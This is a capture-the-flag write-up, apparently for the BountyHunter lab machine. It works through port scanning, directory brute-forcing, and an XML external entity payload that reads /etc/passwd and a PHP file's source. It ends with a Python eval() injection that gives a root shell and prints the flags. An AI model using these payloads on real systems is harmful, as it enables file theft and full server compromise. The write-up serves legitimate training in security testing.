First what we need to do is RECON, turn on the nmap and check what's running on the server.
But nothing specially working on this server, only HTTP and SSH.
```
┌──(kali㉿kali)-[~]
└─$ nmap -sCV 10.10.11.100
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-03 12:49 EDT
Nmap scan report for 10.10.11.100
Host is up (0.22s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Bounty Hunters
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
I go to website and i focused on CONTACT US, but this don't working, let's make some dir search.
I tryed ```gobuster dir -w /usr/share/wordlist/dirb/common.txt -u http://10.10.11.100/``` but i can't find anything intresting. But when i try also this command but add -x php i got more intresting directory's

```
/.php                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.hta.php             (Status: 403) [Size: 277]
/assets               (Status: 301) [Size: 313] [--> http://10.10.11.100/assets/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.11.100/css/]
/db.php               (Status: 200) [Size: 0]
/index.php            (Status: 200) [Size: 25169]
/index.php            (Status: 200) [Size: 25169]
/js                   (Status: 301) [Size: 309] [--> http://10.10.11.100/js/]
/portal.php           (Status: 200) [Size: 125]
/resources            (Status: 301) [Size: 316] [--> http://10.10.11.100/resources/]
/server-status        (Status: 403) [Size: 277]
```

We can see above 2 intresting directorys, portal.php and db.php. Let's check this out.
When i go into this directory i saw this:

![obraz](https://github.com/Anogota/BountyHunter/assets/143951834/a356efbb-905f-404f-82b9-d52e242e21c4)

I tested Bounty Report System - Beta, intercept the traffic with burp.
I got something intresting.

![obraz](https://github.com/Anogota/BountyHunter/assets/143951834/7e8846fc-433e-46dd-9460-f75099d89670)
For first i have no idea what can be this, but i used the cyberchef and know this look's better.

![obraz](https://github.com/Anogota/BountyHunter/assets/143951834/681ae942-6469-4f3b-a9d8-bbbd488b4107)

And now we know there can bee some XXE injection. First we need to check cat the /etc/passwd.
```
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo 
[ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
		<bugreport>
		<title>123</title>
		<cwe>123</cwe>
		<cvss>123</cvss>
		<reward>&xxe;</reward>
		</bugreport>
```
By this XXE we can execute /etc/passwd and got this:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
development:x:1000:1000:Development:/home/development:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
```
There is many user, but only one look's intresting development, let's save this user for late.
When we do dir search, we find db.php, maybe some how we can see what's in this file.
If u have some expirence, you can know where can be this file, but if u don't have any i recomend to run feroxbuster by this command: feroxbuster --url http://10.10.11.100  you can find there a directory. /var/www/html/db.php.
I insert 
```
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo 
[ <!ENTITY xxe SYSTEM "file:///var/www/html/db.php"> ]>
		<bugreport>
		<title>123</title>
		<cwe>123</cwe>
		<cvss>123</cvss>
		<reward>&xxe;</reward>
		</bugreport>
```
But i don't get a request what inside there, let's google something about it. I got what i want. ```php://filter/read=conver.base64-encode/resource=/etc/passwd```
```
Here's the payload
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo 
[ <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/db.php"> ]>
<bugreport>
<title>123</title>
<cwe>123</cwe>
<cvss>123</cvss>
<reward>&xxe;</reward>
</bugreport>
```

![obraz](https://github.com/Anogota/BountyHunter/assets/143951834/94d0b26a-6f1f-47d3-8b55-1f25b68bfa53)

We need to encode this base64

![obraz](https://github.com/Anogota/BountyHunter/assets/143951834/cd56c7a6-7091-45c7-80a0-e0ca86d728a5)

Now need to log in into SSH development@10.10.11.100 ```development@bountyhunter:~$``` Now we need to cat user.txt
```d2010ca95d4ae6dd293479c2611d7579```
The next is sudo -l to check what kind of program/scripts we can run with sudo rights ```(root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py```
There is some intresting scripts 
```
def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()
```
There is exploitable function "eval" 
```
 if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False
```
Now we need to write some code for escalate this function to root below is code, remember to save it with extenstion .mb
```
# Skytrain Inc
## Ticket to 
__Ticket Code:__
**11+eval('11+__import__("os").system("bash")')
```
And we got the root:
```
development@bountyhunter:/tmp$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
/tmp/f.md
Destination: 
root@bountyhunter:/tmp# 
```
```
root@bountyhunter:/tmp# cat /root/root.txt
ea45f230bc63da49c510086169da5c3f
```
